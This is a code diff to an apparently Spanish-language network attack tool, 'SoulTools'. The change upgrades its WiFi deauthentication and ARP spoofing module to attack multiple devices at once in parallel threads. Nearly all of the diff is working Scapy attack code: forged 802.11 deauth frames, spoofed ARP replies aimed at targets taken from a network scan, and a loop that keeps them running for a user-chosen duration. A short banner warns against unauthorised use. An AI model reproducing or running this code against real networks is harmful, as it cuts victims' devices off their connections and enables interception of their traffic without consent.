@@ -3,7 +3,7 @@
 """
 SoulTools - Módulo de Ataque de Desautenticación
 Funcionalidades para interrumpir la conectividad de dispositivos en redes WiFi
-Versión: 1.4
+Versión: 1.5
 """
 
 import os
@@ -15,6 +15,7 @@ import re
 import scapy.all as scapy
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, Ether
 from modules.red import Colors, loading_animation
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def is_monitor_mode(interface):
     """Verifica si la interfaz está en modo monitor (solo Linux)"""
@@ -26,7 +27,7 @@ def is_monitor_mode(interface):
     except:
         return False
 
-def arp_spoof(target_ip, gateway_ip, interface, scanner, duration=30):
+def arp_spoof(target_ip, gateway_ip, interface, scanner, duration, stop_event):
     """Realiza ARP spoofing para interrumpir la conectividad"""
     try:
         # Obtener MAC del dispositivo objetivo desde el escaneo previo
@@ -48,7 +49,7 @@ def arp_spoof(target_ip, gateway_ip, interface, scanner, duration=30):
         if not gateway_mac:
             print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se pudo obtener la MAC del router {gateway_ip} automáticamente.{Colors.RESET}")
             print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Por favor, ingrese la MAC del router (e.g., 30:16:9D:24:5C:34).{Colors.RESET}")
-            gateway_mac = input(f"{Colors.BRIGHT_YELLOW}MAC del router: {Colors.RESET}").strip()
+            gateway_mac = input(f"{Colors.BRIGHT_YELLOW}MAC del router para {target_ip}: {Colors.RESET}").strip()
             # Validar formato de MAC con expresión regular
             if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', gateway_mac):
                 print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de MAC inválido: {gateway_mac}. Use formato XX:XX:XX:XX:XX:XX{Colors.RESET}")
@@ -61,13 +62,30 @@ def arp_spoof(target_ip, gateway_ip, interface, scanner, duration=30):
         # Crear paquete ARP con trama Ethernet
         arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
         start_time = time.time()
-        while (time.time() - start_time) < duration:
+        while (time.time() - start_time) < duration and not stop_event.is_set():
             sendp(arp_response, iface=interface, count=10, inter=0.1, verbose=0)
-            print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes ARP...", end="", flush=True)
-        print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}ARP spoofing completado en {duration} segundos.{Colors.RESET}")
+            print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes ARP a {target_ip}...", end="", flush=True)
+        print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}ARP spoofing completado en {target_ip} ({duration} segundos).{Colors.RESET}")
     except Exception as e:
-        print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante ARP spoofing: {e}{Colors.RESET}")
+        print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante ARP spoofing en {target_ip}: {e}{Colors.RESET}")
         print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Verifique que Scapy y Npcap (en Windows) estén instalados.{Colors.RESET}")
+
+def deauth_single_target(target_ip, target_mac, gateway_ip, gateway_mac, interface, duration, stop_event):
+    """Realiza ataque de desautenticación para un solo objetivo"""
+    try:
+        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Iniciando ataque de desautenticación en {target_ip} ({target_mac})...{Colors.RESET}")
+        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Router: {gateway_ip} ({gateway_mac}){Colors.RESET}")
+        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Duración: {duration} segundos{Colors.RESET}")
+
+        packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
+        start_time = time.time()
+        while (time.time() - start_time) < duration and not stop_event.is_set():
+            sendp(packet, iface=interface, count=10, inter=0.1, verbose=0)
+            print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes de desautenticación a {target_ip}...", end="", flush=True)
+        print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}Ataque completado en {target_ip} ({duration} segundos).{Colors.RESET}")
+    except Exception as e:
+        print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante el ataque en {target_ip}: {e}{Colors.RESET}")
+        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Verifique que Scapy esté instalado y que la interfaz esté en modo monitor.{Colors.RESET}")
 
 def get_gateway_ip():
     """Intenta obtener la IP del router usando múltiples métodos"""
@@ -104,8 +122,9 @@ def get_gateway_ip():
     except:
         return None
 
-def deauth_device(target_ip, interface, scanner, duration=30):
-    """Realiza un ataque de desautenticación o ARP spoofing según el sistema operativo"""
+def deauth_device(target_ips, interface, scanner):
+    """Realiza un ataque de desautenticación o ARP spoofing a múltiples objetivos"""
+    import threading
     
     # Verificar permisos de administrador
     is_admin = False
@@ -129,28 +148,44 @@ def deauth_device(target_ip, interface, scanner, duration=30):
     print(f"║ Solo úselo en redes propias con permiso explícito.    ║")
     print(f"║ El uso no autorizado puede ser ilegal.                ║")
     print(f"╚═══════════════════════════════════════════════════════╝{Colors.RESET}")
-    confirm = input(f"{Colors.BRIGHT_YELLOW}¿Confirmar interrupción de conectividad? (s/N): {Colors.RESET}").lower()
+    confirm = input(f"{Colors.BRIGHT_YELLOW}¿Confirmar interrupción de conectividad para {len(target_ips)} dispositivos? (s/N): {Colors.RESET}").lower()
     if confirm not in ['s', 'si', 'y', 'yes']:
         print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Acción cancelada.{Colors.RESET}")
         return
     
-    # Validar la IP
-    try:
-        ipaddress.IPv4Address(target_ip)
-    except ValueError:
-        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de IP inválido: {target_ip}{Colors.RESET}")
-        return
-    
-    # Obtener la MAC del dispositivo desde los resultados del escáner
-    target_mac = None
-    for host in scanner.active_hosts:
-        if host['ip'] == target_ip and host['mac'] != "No disponible":
-            target_mac = host['mac']
+    # Solicitar duración del ataque
+    while True:
+        try:
+            duration = int(input(f"{Colors.BRIGHT_YELLOW}Ingresa la duración del ataque en segundos (mínimo 1): {Colors.RESET}").strip())
+            if duration < 1:
+                print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}La duración debe ser al menos 1 segundo.{Colors.RESET}")
+                continue
             break
+        except ValueError:
+            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Por favor, ingrese un número válido.{Colors.RESET}")
     
-    if not target_mac:
-        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se encontró una MAC válida para la IP {target_ip} en el escaneo.{Colors.RESET}")
-        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Asegúrese de que el dispositivo esté en los resultados del escaneo.{Colors.RESET}")
+    # Validar IPs
+    valid_targets = []
+    for target_ip in target_ips:
+        try:
+            ipaddress.IPv4Address(target_ip)
+            # Obtener la MAC del dispositivo desde los resultados del escáner
+            target_mac = None
+            for host in scanner.active_hosts:
+                if host['ip'] == target_ip and host['mac'] != "No disponible":
+                    target_mac = host['mac']
+                    break
+            if not target_mac:
+                print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se encontró una MAC válida para la IP {target_ip} en el escaneo.{Colors.RESET}")
+                print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Asegúrese de que el dispositivo esté en los resultados del escaneo.{Colors.RESET}")
+                continue
+            valid_targets.append((target_ip, target_mac))
+        except ValueError:
+            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de IP inválido: {target_ip}{Colors.RESET}")
+            continue
+    
+    if not valid_targets:
+        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No hay objetivos válidos para atacar.{Colors.RESET}")
         return
     
     # Obtener la IP del router
@@ -163,6 +198,16 @@ def deauth_device(target_ip, interface, scanner, duration=30):
             ipaddress.IPv4Address(gateway_ip)
         except ValueError:
             print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de IP inválido para el router: {gateway_ip}{Colors.RESET}")
+            return
+    
+    # Obtener la MAC del router
+    gateway_mac = scapy.getmacbyip(gateway_ip)
+    if not gateway_mac:
+        print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}No se pudo obtener la MAC del router {gateway_ip} automáticamente.{Colors.RESET}")
+        print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Por favor, ingrese la MAC del router (e.g., 30:16:9D:24:5C:34).{Colors.RESET}")
+        gateway_mac = input(f"{Colors.BRIGHT_YELLOW}MAC del router: {Colors.RESET}").strip()
+        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', gateway_mac):
+            print(f"{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Formato de MAC inválido: {gateway_mac}. Use formato XX:XX:XX:XX:XX:XX{Colors.RESET}")
             return
     
     # Verificar si la interfaz es válida
@@ -184,23 +229,36 @@ def deauth_device(target_ip, interface, scanner, duration=30):
         return
     
     # Determinar el tipo de ataque según el sistema operativo
+    stop_event = threading.Event()
     if os.name == 'nt' or not is_monitor_mode(interface):
         # Usar ARP spoofing en Windows o si no está en modo monitor
-        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Usando ARP spoofing (modo compatible con Windows o sin modo monitor).{Colors.RESET}")
-        arp_spoof(target_ip, gateway_ip, interface, scanner, duration)
+        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Usando ARP spoofing para {len(valid_targets)} objetivos (modo compatible con Windows o sin modo monitor).{Colors.RESET}")
+        with ThreadPoolExecutor(max_workers=len(valid_targets)) as executor:
+            futures = [
+                executor.submit(arp_spoof, target_ip, gateway_ip, interface, scanner, duration, stop_event)
+                for target_ip, _ in valid_targets
+            ]
+            try:
+                for future in as_completed(futures):
+                    future.result()  # Esperar a que cada hilo termine
+            except KeyboardInterrupt:
+                print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Interrumpido por el usuario (Ctrl+C). Deteniendo ataques...{Colors.RESET}")
+                stop_event.set()
+                executor._threads.clear()  # Limpiar hilos
     else:
         # Usar ataque de desautenticación en Linux con modo monitor
-        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Iniciando ataque de desautenticación en {target_ip} ({target_mac})...{Colors.RESET}")
-        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Router: {gateway_ip} ({gateway_mac}){Colors.RESET}")
-        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Duración: {duration} segundos{Colors.RESET}")
-        
-        try:
-            packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
-            start_time = time.time()
-            while (time.time() - start_time) < duration:
-                sendp(packet, iface=interface, count=10, inter=0.1, verbose=0)
-                print(f"\r{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} Enviando paquetes de desautenticación...", end="", flush=True)
-            print(f"\n{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}Ataque completado en {duration} segundos.{Colors.RESET}")
-        except Exception as e:
-            print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Error durante el ataque: {e}{Colors.RESET}")
-            print(f"{Colors.BRIGHT_YELLOW}[*]{Colors.RESET} {Colors.WHITE}Verifique que Scapy esté instalado y que la interfaz esté en modo monitor.{Colors.RESET}")
+        print(f"{Colors.BRIGHT_CYAN}[*]{Colors.RESET} {Colors.WHITE}Usando ataque de desautenticación para {len(valid_targets)} objetivos...{Colors.RESET}")
+        with ThreadPoolExecutor(max_workers=len(valid_targets)) as executor:
+            futures = [
+                executor.submit(deauth_single_target, target_ip, target_mac, gateway_ip, gateway_mac, interface, duration, stop_event)
+                for target_ip, target_mac in valid_targets
+            ]
+            try:
+                for future in as_completed(futures):
+                    future.result()  # Esperar a que cada hilo termine
+            except KeyboardInterrupt:
+                print(f"\n{Colors.BRIGHT_RED}[!]{Colors.RESET} {Colors.WHITE}Interrumpido por el usuario (Ctrl+C). Deteniendo ataques...{Colors.RESET}")
+                stop_event.set()
+                executor._threads.clear()  # Limpiar hilos
+    
+    print(f"{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.WHITE}Todos los ataques han finalizado.{Colors.RESET}")
